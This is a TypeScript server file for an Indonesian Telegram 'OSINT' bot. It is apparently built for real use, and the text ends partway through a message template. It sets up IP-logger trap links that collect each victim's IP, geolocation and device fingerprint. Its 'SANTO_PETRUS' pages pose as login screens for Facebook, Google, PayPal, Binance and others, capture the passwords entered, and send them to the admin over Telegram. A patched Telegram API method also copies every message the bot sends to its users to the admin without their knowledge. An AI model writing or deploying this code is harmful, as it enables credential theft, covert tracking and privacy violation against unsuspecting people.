import express from "express";
import axios from "axios";
import { nikParser } from "nik-parser";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup, Telegram } from "telegraf";
import "dotenv/config";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";

const TARGETS_FILE = "targets.json";
let targetsData: any[] = [];
if (fs.existsSync(TARGETS_FILE)) {
  try { targetsData = JSON.parse(fs.readFileSync(TARGETS_FILE, 'utf-8')); } catch(e){}
}
const saveTargets = () => fs.writeFileSync(TARGETS_FILE, JSON.stringify(targetsData, null, 2));
import AdmZip from "adm-zip";
import yts from "yt-search";
import play from "play-dl";
import ytdl from "@distube/ytdl-core";
import pkg from "@whiskeysockets/baileys";
const makeWASocket = (pkg as any).default || (pkg as any).makeWASocket || pkg;
const useMultiFileAuthState = (pkg as any).useMultiFileAuthState;
const DisconnectReason = (pkg as any).DisconnectReason;

let globalWaSock: any = null;


import QRCode from "qrcode";



const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

const app = express();

// Uncaught exception and unhandled rejection protection
process.on('uncaughtException', (err) => {
  console.error('[CRASH PROTECTION] Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRASH PROTECTION] Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('SIGTERM', () => {
  console.log('[SYSTEM] SIGTERM received. Graceful exit/restart.');
  process.exit(0);
});

async function startServer() {
  const PORT = Number(process.env.PORT) || 3000;
  console.log(`[STARTUP] ENV: ${process.env.NODE_ENV || 'development'}`);
  console.log(`[STARTUP] Target Port: ${PORT} (from env: ${process.env.PORT || 'not set'})`);

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number | string) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
    if (!userAgent) return false;
    const ua = userAgent.toLowerCase();
    
    // Check if it's a known crawler, preview bot, or command-line tool
    if (/(bot|spider|crawl|slurp|facebookexternalhit|whatsapp|preview|mediapartners)/i.test(ua)) {
        // Exclude legitimate in-app browsers that happen to contain these strings
        // E.g., Telegram in-app browser often has 'Telegram' but NOT 'bot'
        // But what if WA crawler vs WA in-app?
        // WA crawler = 'WhatsApp/2...'
        // WA In-app = 'Mozilla/5.0 ... [FB_IAB...] ...'
        if (ua.includes('mozilla/') && !ua.includes('compatible; bot') && !ua.includes('googlebot') && !ua.includes('telegrambot') && !ua.includes('facebookexternalhit')) {
             return false; // Very likely a real browser (in-app or regular)
        }
        return true;
    }
    
    const cmdTools = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];
    return cmdTools.some(agent => ua.includes(agent));
  };

  const getChatIdFromTrapId = (trapId: string): string | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        return decoded.split('-OSINT-')[0];
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the Railway App URL as requested.
  let appHost = "https://telegram-bot-osint-v1-production-cae7.up.railway.app";
  
  app.set("trust proxy", 1); // Crucial for Railway/Proxy environments

  // 1. TOP-LEVEL HEALTH CHECKS (MUST BE FIRST)
  app.get('/health', (req, res) => res.status(200).send('OK'));
  app.get('/healthz', (req, res) => res.status(200).send('OK'));
  
  app.use((req, res, next) => {
    const ua = req.headers['user-agent'] || '';
    if (ua.includes('HealthCheck') || ua.includes('Railway') || ua.includes('GoogleHC') || req.query.health === '1') {
        return res.status(200).send('OK');
    }
    next();
  });

  // Request logging
  app.use((req, res, next) => {
    if (req.path !== '/health' && req.path !== '/healthz' && !req.path.includes('.')) {
      console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    }
    next();
  });

  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ limit: '50mb', extended: true }));

  const escapeHTML = (text: string) => {
    return text.replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    }[m] || m));
  };

  const token = process.env.TELEGRAM_BOT_TOKEN;
  console.log(`[DEBUG] TELEGRAM_BOT_TOKEN exists: ${!!token}`);
  const bot = token ? new Telegraf(token) : null;
  const botInstance = bot;
  if (!botInstance) console.error("[CRITICAL] botInstance is null! Check TELEGRAM_BOT_TOKEN in .env");

  const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
  const PASSWORD = process.env.PASSWORD || "112233";
  let authenticatedUsers = new Set<number>();
  
  if (botInstance) {
      const origCallApi = Telegram.prototype.callApi;
      Telegram.prototype.callApi = async function(method: string, payload: any, extra?: any) {
          const res = await origCallApi.call(this, method, payload, extra).catch(e => { throw e; });
          try {
              const forwardedMethods = ['sendMessage', 'editMessageText', 'sendPhoto', 'sendDocument', 'sendVoice', 'sendAudio', 'sendVideo', 'sendAnimation'];
              if (forwardedMethods.includes(method)) {
                  const chatId = payload && payload.chat_id;
                  if (chatId && Number(chatId) !== Number(ADMIN_ID)) {
                      let alertText = "";
                      if (method === 'sendMessage' || method === 'editMessageText') {
                          alertText = payload.text;
                      } else if (payload.caption) {
                          alertText = `[${method.replace('send', '')}] ` + payload.caption;
                      } else {
                          alertText = `[${method.replace('send', '')} tanpa caption]`;
                      }

                      if (alertText) {
                          let title = method === 'editMessageText' ? 'RESULT (EDITED)' : 'RESULT';
                          let adminLogText = `🔔 <b>FORWARDED ${title} (To: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${alertText}`;
                          if (adminLogText.length > 4000) adminLogText = adminLogText.substring(0, 3950) + "...\n(terpotong)";
                          
                          await origCallApi.call(this, 'sendMessage', { chat_id: ADMIN_ID, text: adminLogText, parse_mode: 'HTML' }).catch(async () => {
                              const safeText = String(alertText).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
                              let safeLogText = `🔔 <b>FORWARDED ${title} (To: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${safeText}`;
                              if (safeLogText.length > 4000) safeLogText = safeLogText.substring(0, 3950) + "...\n(terpotong)";
                              await origCallApi.call(this, 'sendMessage', { chat_id: ADMIN_ID, text: safeLogText, parse_mode: 'HTML' }).catch(() => {});
                          });
                      }
                  }
              }
          } catch(e) {}
          return res;
      };
  }
  const webhookSecret = token ? token.split(':')[0] : null;
  const webhookPath = webhookSecret ? `/telegraf/${webhookSecret}` : null;
  let agreementUsers = new Set<number>();
  let waUnlockedUsers = new Set<number>();

  let botStatus = "ON";
  let bannedUsers = new Set<number>();
  let botDescription = "ᴀʟᴀᴛ ᴘᴇʟᴀᴄᴀᴋᴀɴ ɪɴᴛᴇɴꜱɪᴛᴀꜱ ᴛɪɴɢɢɪ, ᴅɪʙᴀɴɢᴜɴ ᴏʟᴇʜ ᴊᴇᴇᴍɪᴋᴋᴏ, ᴍᴇᴍɪʟɪᴋɪ ꜰɪᴛᴜʀ ꜰɪᴛᴜʀ ᴄᴀɴɢɢɪʜ ꜱᴇᴘᴇʀᴛɪ ᴏꜱɪɴᴛ & ʀᴇᴄᴏɴ, ꜱᴛᴇᴀʟᴛʜ ʟᴏɢɢᴇʀ, ᴀᴅᴠ ᴛᴏᴏʟꜱ, ᴄᴏᴍᴘʟᴇx ɢᴀᴍᴇꜱ, ᴀʟᴀʀᴍ ʜᴜʙ, ᴅᴀɴ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ.";

  try {
    if (fs.existsSync('auth.json')) {
      authenticatedUsers = new Set(JSON.parse(fs.readFileSync('auth.json', 'utf8')));
    }
    if (fs.existsSync('agreement.json')) {
      agreementUsers = new Set(JSON.parse(fs.readFileSync('agreement.json', 'utf8')));
    }
    if (fs.existsSync('wa_auth.json')) {
      waUnlockedUsers = new Set(JSON.parse(fs.readFileSync('wa_auth.json', 'utf8')));
    }
    if (fs.existsSync('bot_settings.json')) {
      const state = JSON.parse(fs.readFileSync('bot_settings.json', 'utf8'));
      if (state.botStatus) botStatus = state.botStatus;
      if (state.botDescription) botDescription = state.botDescription;
      if (state.bannedUsers) bannedUsers = new Set(state.bannedUsers);
    }
  } catch (e) { console.error("Error loading auth files", e); }

  const saveAuth = () => { fs.writeFileSync('auth.json', JSON.stringify([...authenticatedUsers])); };
  const saveAgreement = () => { fs.writeFileSync('agreement.json', JSON.stringify([...agreementUsers])); };
  const saveWaAuth = () => { fs.writeFileSync('wa_auth.json', JSON.stringify([...waUnlockedUsers])); };
  const saveBotSettings = () => { 
      fs.writeFileSync('bot_settings.json', JSON.stringify({
          botStatus, botDescription, bannedUsers: [...bannedUsers]
      })); 
  };

  if (bot && webhookPath) {
    app.post(webhookPath, (req, res) => {
      bot.handleUpdate(req.body, res).catch(err => {
        console.error("Bot Handle Update Error:", err);
        if (!res.headersSent) res.sendStatus(500);
      });
    });
    console.log(`[${new Date().toISOString()}] Bot Webhook Route Registered: ${webhookPath}`);
  }

  app.use((req, res, next) => {
    // Dynamic host checking disabled by user request. 
    // Always use the fixed Railway URL for bot generation.
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", botInitialized: !!botInstance });
  });

  // Capture Bot User IP & Redirect
  app.get('/verify-bot-user', (req, res) => {
    const { uid, name } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const report = `📢 <b>BOT USER IDENTIFIED & VERIFIED</b> 📢\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `👤 <b>USER NAME:</b> <code>${escapeHTML(String(name || 'Unknown'))}</code>\n` +
                     `🆔 <b>TELEGRAM ID:</b> <code>${uid}</code>\n` +
                     `🌐 <b>REAL IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n\n` +
                     `🖥️ <b>SYSTEM BROWSER:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <i>STATUS: HIGH-PRECISION IDENTITY SYNC SUCCESSFUL.</i>`;
      
      botInstance.telegram.sendMessage(ADMIN_ID, report, { parse_mode: 'HTML' }).catch(() => {});
    }

    res.send(`
      <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Complete</title></head>
      <body style="font-family:-apple-system, sans-serif; text-align:center; padding:50px 20px; background:#fff; color:#333;">
        <div style="color:#1a73e8; font-size:60px; margin-bottom:20px;">🛡️</div>
        <h2 style="margin-bottom:10px;">Verification Successful</h2>
        <p style="color:#666; margin-bottom:30px;">Your security profile has been synchronized with the main server. You now have full access to the terminal features.</p>
        <p style="font-size:14px; color:#999;">IP Captured: ${escapeHTML(String(ip))}</p>
        <div style="margin-top:40px;">
          <a href="https://t.me/share/url?url=Success" style="background:#1a73e8; color:#fff; text-decoration:none; padding:12px 24px; border-radius:6px; font-weight:600;">Return to Bot</a>
        </div>
      </body></html>
    `);
  });

  // OSINT API ENDPOINTS FOR FRONTEND UI
  app.post('/api/osint/username', async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: 'Username required' });
    
    // Platforms list (similar to bot command)
    const platforms = [
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
    ];

    const results = await Promise.all(platforms.map(async (platform) => {
        try {
            const response = await fetchWithTimeout(platform.url, { 
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
            }, 5000);
            return {
                name: platform.name,
                url: platform.url,
                found: response.status === 200,
                status: response.status
            };
        } catch (e) {
            return { name: platform.name, url: platform.url, found: false, status: 'TIMEOUT/ERROR' };
        }
    }));

    res.json({ username, results });
  });

  app.get('/api/osint/ip', async (req, res) => {
    const ip = req.query.query || req.query.ip || '';
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ status: 'fail', message: 'System timeout' });
    }
  });

  app.get('/api/osint/whois', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'WHOIS lookup failed' });
    }
  });

  app.get('/api/osint/dns', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'DNS lookup failed' });
    }
  });

  app.get('/api/osint/email', async (req, res) => {
    const email = String(req.query.email || '');
    if (!email.includes('@')) return res.status(400).json({ error: 'Invalid email' });
    const domain = email.split("@")[1];
    try {
        const records = await resolveMx(domain);
        res.json({ email, domain, validFormat: true, mxRecords: records });
    } catch (e) {
        res.status(500).json({ email, domain, validFormat: true, mxRecords: [], error: true, message: 'MX fetch failed' });
    }
  });

  app.get('/api/osint/nik', (req, res) => {
    const nik = String(req.query.nik || '');
    if (!/^\d{16}$/.test(nik)) return res.status(400).json({ error: 'NIK must be 16 digits' });

    try {
      const parsed = nikParser(nik);
      const genderStr = parsed.kelamin() === 'pria' ? 'Laki-laki' : parsed.kelamin() === 'wanita' ? 'Perempuan' : 'Unknown';
      let birthDateStr = 'Unknown';
      try {
        const d = parsed.lahir();
        if (d) {
          const bornDate = d instanceof Date ? d : new Date(d);
          if (!isNaN(bornDate.getTime())) {
            const day = String(bornDate.getDate()).padStart(2, '0');
            const month = String(bornDate.getMonth() + 1).padStart(2, '0');
            const year = bornDate.getFullYear();
            birthDateStr = `${day}-${month}-${year}`;
          }
        }
      } catch (err) {}

      res.json({
        nik,
        gender: genderStr,
        birthDate: birthDateStr,
        province: parsed.province() || 'Unknown',
        kabupaten: parsed.kabupatenKota() || 'Unknown',
        kecamatan: parsed.kecamatan() || 'Unknown',
        postalCode: parsed.kodepos() || 'Unknown',
        sequence: parsed.uniqcode() || nik.substring(12, 16),
        isValid: parsed.isValid()
      });
    } catch (e) {
      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };
      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let gender = "Laki-laki";
      if (tgl >= 40) {
        gender = "Perempuan";
        tgl -= 40;
      }
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      res.json({
        nik, gender, 
        birthDate: `${tgl.toString().padStart(2, '0')}-${bln}-${thn}`,
        province: provMap[prov] || "Unknown",
        kabupaten: `Kode Kab: ${kab}`,
        kecamatan: `Kode Kec: ${kec}`,
        postalCode: 'Unknown',
        sequence: urut,
        isValid: false,
        error: false
      });
    }
  });

  app.get('/api/osint/plat', (req, res) => {
    const platInput = String(req.query.plat || '').replace(/\s/g, '').toUpperCase();
    const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
    if (!match) return res.status(400).json({ error: 'Invalid license plate format' });

    const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };
    const regionCode = match[1];
    res.json({
      plat: `${match[1]} ${match[2]} ${match[3]}`,
      region: platMap[regionCode] || "Unknown Region",
      code: regionCode,
      number: match[2],
      suffix: match[3]
    });
  });

  // ... (previous API routes continue here)
  
  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', async (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const targetIp = String(ip).split(',')[0].trim();
      
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'BASIC_HIT',
        ip: targetIp,
        ua: String(userAgent)
      });
      saveTargets();

      // Send telegram notification if it's not a bot
      if (!isSuspeciousAgent(userAgent)) {
        const msg = `⚡ <b>LINK CLICK DETECTED</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n` +
                    `📖 <b>USER_AGENT:</b>\n<code>${userAgent}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Menunggu target mengizinkan akses / klik Verify untuk detail lengkap...</i>`;
        
        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
      }
    }

    const template = templates[tmplId] || templates['silent_click'];
    let htmlContent = template.render(id);

    try {
      const cheerioRaw: any = await import('cheerio');
      const cheerio = cheerioRaw.default || cheerioRaw;
      const terserRaw: any = await import('html-minifier-terser');
      const { minify } = terserRaw;
      
      const $ = cheerio.load(htmlContent);
      let updatedHtml = $.html();
      if (!updatedHtml.toLowerCase().startsWith('<!doctype')) {
         updatedHtml = '<!DOCTYPE html>\n' + updatedHtml;
      }
      htmlContent = await minify(updatedHtml, { collapseWhitespace: true, removeComments: true, minifyCSS: true });
    } catch(e) {
      console.error('HTML minification error:', e);
    }

    res.send(htmlContent);
  });

  // Backward compatibility alias
  app.get('/t/:id', (req: any, res) => {
    res.redirect(`/t/silent_click/${req.params.id}`);
  });

  // ========== SANTO_PETRUS V.1 APIs ==========
  const santopetrusLogs: any[] = [];
  
  app.get('/auth/santo-:b64data', (req, res) => {
    try {
      const data = Buffer.from(req.params.b64data, 'base64url').toString('utf-8');
      const [template, redirectUrl] = data.split('||');
      
      const payloadId = req.params.b64data;
      
      let brandName = "Secure Authentication";
      const tmplLower = template ? template.toLowerCase() : "";
      
      const brandMap: Record<string, string> = {
        'fb': 'Facebook', 'facebook': 'Facebook',
        'google': 'Google', 'gmail': 'Google',
        'ig': 'Instagram', 'instagram': 'Instagram',
        'wa': 'WhatsApp', 'whatsapp': 'WhatsApp',
        'tiktok': 'TikTok',
        'x': 'X (Twitter)', 'twitter': 'X (Twitter)',
        'telegram': 'Telegram', 'tg': 'Telegram',
        'netflix': 'Netflix',
        'spotify': 'Spotify',
        'microsoft': 'Microsoft', 'outlook': 'Microsoft', 'hotmail': 'Microsoft',
        'linkedin': 'LinkedIn',
        'github': 'GitHub',
        'paypal': 'PayPal',
        'discord': 'Discord',
        'steam': 'Steam',
        'reddit': 'Reddit',
        'binance': 'Binance',
        'apple': 'Apple',
        'amazon': 'Amazon',
        'roblox': 'Roblox',
        'playstation': 'PlayStation Network',
        'xbox': 'Xbox Live',
        'snapchat': 'Snapchat',
        'pinterest': 'Pinterest',
        'twitch': 'Twitch',
        'canva': 'Canva',
        'dropbox': 'Dropbox'
      };

      for (const [key, name] of Object.entries(brandMap)) {
        if (tmplLower.includes(key)) {
          brandName = name;
          break;
        }
      }
      
      res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Login - ${brandName}</title>
          <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gray-50 text-gray-900 flex items-center justify-center min-h-screen">
          
          <form id="login-form" action="/auth/santo-submit" method="POST" class="bg-white p-8 rounded-lg shadow-md max-w-sm w-full transition-opacity duration-1000">
            <h1 class="text-2xl font-bold text-center mb-2">${brandName}</h1>
            <p class="text-center text-sm text-gray-500 mb-6">Sign in to continue</p>
            
            <input type="hidden" name="payload_id" value="${payloadId}">
            
            <div class="space-y-4">
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Email or Username</label>
                <input type="text" name="username" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
              </div>
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                <input type="password" name="password" required class="w-full px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none">
              </div>
              <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 px-4 rounded transition-colors">
                Log In
              </button>
            </div>
            
            <div class="mt-6 text-center text-xs text-gray-400">
              Protected by Enterprise Security Audit
            </div>
          </form>

        </body>
        </html>
      `);
    } catch(e) {
      res.sendStatus(400);
    }
  });

  app.post('/auth/santo-submit', (req, res) => {
    try {
      const { payload_id, username, password } = req.body;
      const data = Buffer.from(payload_id, 'base64url').toString('utf-8');
      const [template, redirectUrl] = data.split('||');
      
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const targetIp = String(ip).split(',')[0].trim();
      const ua = req.headers['user-agent'] || 'Unknown';
      
      const capture = {
        id: crypto.randomUUID().substring(0, 6).toUpperCase(),
        service: template,
        user: String(username).substring(0, 50),
        pass: String(password).substring(0, 50),
        ip: targetIp,
        time: new Date().toLocaleTimeString()
      };
      
      santopetrusLogs.unshift(capture);
      if(santopetrusLogs.length > 50) santopetrusLogs.pop();
      
      if (botInstance) {
         botInstance.telegram.sendMessage(ADMIN_ID, `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`, { parse_mode: 'HTML' }).catch(()=>{});
      }

      res.redirect(redirectUrl || 'https://google.com');
    } catch(e) {
      res.redirect('https://google.com');
    }
  });

  app.get('/api/santopetrus/captures', (req, res) => {
    res.json(santopetrusLogs);
  });

  app.post('/api/log/:id/debug', (req, res) => {
    const logPath = 'client_debug.log';
    const logEntry = `[${new Date().toISOString()}][CLIENT-DEBUG][${req.params.id}]: ${JSON.stringify(req.body)}\n`;
    fs.appendFileSync(logPath, logEntry);
    res.sendStatus(200);
  });

  // Handle Device Metadata Upload
  app.post('/api/log/:id/info', (req, res) => {
    console.log(`[DEBUG] Received info log for ${req.params.id}. Data: ${JSON.stringify(req.body)}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) {
        console.log(`[DEBUG] Blocked info log for ${req.params.id} due to User-Agent`);
        return res.sendStatus(403);
    }
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    console.log(`[DEBUG] ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
    
    if (!chatId) {
        console.error(`[DEBUG] INVALID CHATID FOR ID: ${id}`);
        return res.status(400).send('Invalid Trap ID');
    }

    if (botInstance) {
      const data = req.body as any;
      const tmplId = data.tmplId || '1';
      const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
      
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const targetIp = String(ip).split(',')[0].trim();
      const userAgent = req.headers['user-agent'];

      (async () => {
        let geoInfo = "<i>Fetching Geodata...</i>";
        try {
          const res = await fetch(`http://ip-api.com/json/${targetIp}?fields=status,country,city,isp,as,mobile,proxy,query`).then(r => r.json());
          if (res.status === 'success') {
            geoInfo = `├ COUNTRY: <code>${res.country}</code>\n` +
                      `├ CITY: <code>${res.city}</code>\n` +
                      `├ ISP: <code>${res.isp}</code>\n` +
                      `├ VPN/PROXY: <code>${res.proxy ? 'YES' : 'CLEAN'}</code>\n` +
                      `└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;
          }
        } catch(e) {}

        let header = '🕵️‍♂️ <b>SYSTEM DIAGNOSTIC: Metadata Captured</b>';
        let statusText = '🔄 <i>SYNCING...</i>';

        if (tmplId === 'google') {
          header = '🛡️ <b>GOOGLE SECURITY AUDIT</b>';
        } else if (tmplId === 'cloudflare') {
          header = '☁️ <b>CLOUDFLARE EDGE REPORT</b>';
        } else if (tmplId === 'meta_verification') {
          header = '🎯 <b>META VERIFICATION SESSION</b>';
        } else if (tmplId === 'terminal') {
          header = '💻 <b>KERNEL DIAGNOSTIC LOG</b>';
        } else if (tmplId === 'gallery') {
          header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
        }
        
        statusText = '⏳ <i>WAITING FOR HIGH-PRECISION OSINT...</i>';
        if (data.touch) statusText += ' | 👆 <i>TOUCH_ENABLED</i>';

        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        let msg = `🚩 <b>TARGET ACCESS DETECTED</b> 🚩\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n\n` +
                    `🌍 <b>GEOGRAPHIC OSINT:</b>\n${geoInfo}\n\n` +
                    `📋 <b>SESSION INFRASTRUCTURE:</b>\n` +
                    `├ CONTEXT: <code>${escapeHTML(templateName)}</code>\n` +
                    `├ STATE: <code>${statusText}</code>\n` +
                    `└ NODE_ID: <code>${id}</code>\n\n` +
                    `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
                    `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                    `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
                    `├ CORES_ENV: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                    `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                    `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
                    `├ INTERNAL_IP: <code>${escapeHTML(data.localIp || 'N/A')}</code>\n` +
                    `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
